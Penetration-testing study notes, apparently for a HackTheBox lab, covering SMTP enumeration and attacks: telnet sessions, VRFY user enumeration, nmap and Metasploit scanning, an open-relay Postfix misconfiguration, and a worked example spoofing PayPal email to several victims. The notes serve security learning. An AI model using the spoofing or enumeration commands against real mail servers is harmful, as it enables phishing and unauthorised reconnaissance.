Ports: 25, 587

Interacting SMTP
```bash
telnet 10.129.14.128 25

HELO mail1.inlanefreight.htb # Check if common-name is alive

EHLO <common-name> # Start communication 

MAIL FROM <email>
 
RCPT TO <recipient> 

DATA From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb> 
Subject: DB 
Date: Tue, 28 Sept 2021 16:32:51 +0200 
Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there? . # . to end 

QUIT
```
Username Enumeration
- Doesn't always work, SMTP may issue 252 confirming existence of user that does not exist
```bash
VRFY <USERNAME>
```
(nmap) User Enumeration
```bash
nmap -p 25 10.129.201.239 --script smtp-enum-users --script-args smtp-enum-users.methods=VRFY,userdb=/usr/share/wordlist/usernames.txt
```
(MetaSploit) SMTP Version
```bash
auxiliary/scanner/smtp/smtp_version
```
(MetaSploit) User Enumeration
```bash
auxiliary/scanner/smtp/smtp_enum
```
### Open Relay Attack
Prevent email from being filtered by span, sender can use relay server that recipient trusts. However, administrators often have no overview of which IP ranges they are allowed, to prevent email from being blocked administrators often just allow all traffic.

Misconfiguration vulnerable to Open Relay Attacks, with this config attacks can also send fake emails.
```bash
# /etc/postfix/main.cf

mynetworks = 0.0.0.0/0
```
Spoofing Email Addresses
```bash
telnet 10.129.14.128 25

HELO attacker.com

MAIL FROM:<spoofed@paypal.com>
 
RCPT TO:<victim1@example.com>
RCPT TO:<victim2@example.com>
RCPT TO:<victim3@example.com>

DATA 
From: Paypal<spoofed@paypal.com> # MTA does not require authentication, so any email works
To: <victim@exmaple.com> 
Subject: DB 
Date: Tue, 28 Sept 2021 16:32:51 +0200 
Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there? . # . to end 

QUIT
```
(nmap) Scanning Open Relay
```bash
nmap 10.129.14.128 -p 25 --script smtp-open-relay -v
```
(mxtoolbox) Scanning Open Relay
https://mxtoolbox.com/diagnostic.aspx